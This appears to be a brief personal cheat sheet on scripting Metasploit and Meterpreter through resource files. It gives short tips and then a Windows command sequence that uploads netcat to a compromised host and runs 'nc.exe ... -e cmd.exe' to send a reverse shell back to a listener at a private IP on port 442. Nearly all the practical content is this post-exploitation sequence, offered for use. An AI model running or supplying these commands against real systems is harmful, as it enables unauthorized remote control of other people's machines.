# Put your meterpreter and metasploit commands into "resource" files.

# INITIAL METASPLOIT

you can script the initial metasploit commands in one and run it first stuff like setting the payload and rhost etc
you can also use <ruby> </ruby> tags to use ruby script and get accesss to the metasploit API as well as ruby scripting.

# METERPRETER SCRIPTING
you can script the meterpreter commands as written in a separate script (you can't combine metasploit scripts and meterpreter scripts I believe) but regardless, when you get a meterpreter shell you can just run the meterpreter resource script immediately afterwards.

# EXAMPLE (windows):

In order to immediately create a temporary folder you can write to and then download netcat and use it for a connection if your shell is dropping, you can do this:

It will spawn a shell back to the nc you have listening on port 442

cd c:\
mkdir c:\temp
cd c:\temp
pwd
upload nc.exe c:\\temp
ls
execute -f 'nc.exe 192.168.1.9 442 -e cmd.exe'




